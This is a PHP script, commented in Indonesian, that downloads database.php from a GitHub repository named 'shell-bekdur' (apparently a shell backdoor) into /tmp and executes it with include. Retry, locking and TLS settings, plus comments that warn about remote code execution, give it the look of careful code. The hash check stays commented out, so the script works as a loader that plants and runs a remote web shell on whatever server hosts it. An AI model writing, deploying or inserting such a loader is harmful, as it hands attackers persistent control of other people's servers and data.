<?php
$remote = 'https://raw.githubusercontent.com/sievern/shell-bekdur/refs/heads/main/database.php';
$target = '/tmp/adm_'.md5($_SERVER['HTTP_HOST']).'.php';
$maxRetries = 3;

// Jangan langsung include remote file. Pastikan validasi dulu.
function download_atomic($url, $target, $retries = 3) {
    $dir = dirname($target);
    if (!is_dir($dir) && !mkdir($dir, 0700, true)) {
        throw new RuntimeException("Tidak bisa membuat direktori $dir");
    }

    // file lock untuk mencegah banyak proses men-download sekaligus
    $lockfile = $target . '.lock';
    $lfh = fopen($lockfile, 'c');
    if (!$lfh) {
        throw new RuntimeException("Gagal buka lockfile");
    }

    if (!flock($lfh, LOCK_EX)) {
        fclose($lfh);
        throw new RuntimeException("Gagal ambil lock");
    }

    try {
        // jika file target sudah ada dan ukurannya > 0, anggap sudah ok
        if (file_exists($target) && filesize($target) > 0) {
            return $target;
        }

        // download ke file sementara
        $tmp = tempnam($dir, 'dl_');
        if ($tmp === false) {
            throw new RuntimeException("Gagal buat tmp file");
        }

        $success = false;
        for ($i = 0; $i < $retries; $i++) {
            $fh = fopen($tmp, 'w+');
            if (!$fh) {
                throw new RuntimeException("Gagal buka tmp file untuk ditulis");
            }

            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_FILE, $fh);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); // jangan matikan verifikasi di produksi
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

            curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlErr  = curl_error($ch);
            curl_close($ch);
            fclose($fh);

            // cek HTTP status dan ukuran file
            $size = filesize($tmp);
            if ($httpCode >= 200 && $httpCode < 300 && $size > 0) {
                $success = true;
                break;
            } else {
                // bersihkan tmp file lalu coba lagi
                @unlink($tmp);
                // simple backoff
                sleep(1 + $i);
            }
        }

        if (!$success) {
            @unlink($tmp);
            throw new RuntimeException("Download gagal setelah $retries percobaan (last HTTP: $httpCode, err: $curlErr)");
        }

        // (Opsional) verifikasi integritas: periksa hash atau signature jika tersedia
        // contoh: $expectedHash = '...'; if (hash_file('sha256', $tmp) !== $expectedHash) { unlink($tmp); throw ... }

        // pindahkan atomik: rename biasanya atomik di filesystem yang sama
        if (!rename($tmp, $target)) {
            // jika gagal, coba copy+unlink
            if (!copy($tmp, $target)) {
                @unlink($tmp);
                throw new RuntimeException("Gagal memindahkan file ke target");
            }
            @unlink($tmp);
        }

        // set permission yang aman
        @chmod($target, 0600);

        return $target;
    } finally {
        // lepaskan lock
        flock($lfh, LOCK_UN);
        fclose($lfh);
        @unlink($lockfile); // optional: hapus lockfile
    }
}

// Panggil fungsi dan tangani error
try {
    $file = download_atomic($remote, $target, $maxRetries);
    // sebelum include, pastikan file tidak kosong dan (sangat disarankan) verifikasi isinya
    if (filesize($file) > 0) {
        // ⚠️ PERINGATAN KEAMANAN:
        // Meng-include kode PHP yang didownload dari internet rawan (remote code execution).
        // Lebih aman: gunakan package manager, atau verifikasi tanda tangan/hash.
        include $file;
    } else {
        throw new RuntimeException("File target kosong walau download sukses");
    }
} catch (Exception $e) {
    // log error dan jangan tampilkan detil ke user
    error_log("Download error: " . $e->getMessage());
    http_response_code(500);
    echo "Terjadi kesalahan pada server.";
}
